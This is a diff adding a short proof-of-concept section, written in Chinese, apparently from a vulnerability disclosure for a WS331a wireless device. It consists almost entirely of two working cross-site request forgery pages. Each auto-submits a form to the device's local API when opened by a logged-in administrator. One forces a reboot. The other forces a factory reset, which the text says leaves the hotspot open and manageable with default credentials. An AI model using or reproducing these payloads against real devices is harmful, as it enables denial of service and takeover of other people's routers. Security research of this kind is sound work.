@@ -1,0 +1,15 @@
+### POC实现代码如下：  
+
+> 当管理员登陆后，打开如下poc页面，WS331a设备将重启。
+``` html
+<form action="http://192.168.3.1/api/service/reboot.cgi" method="post">
+</form>
+<script> document.forms[0].submit(); </script>
+```
+> 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。   
+
+```html
+<form action="http://192.168.3.1/api/service/restoredefcfg.cgi" method="post">
+</form>
+<script> document.forms[0].submit(); </script>
+```
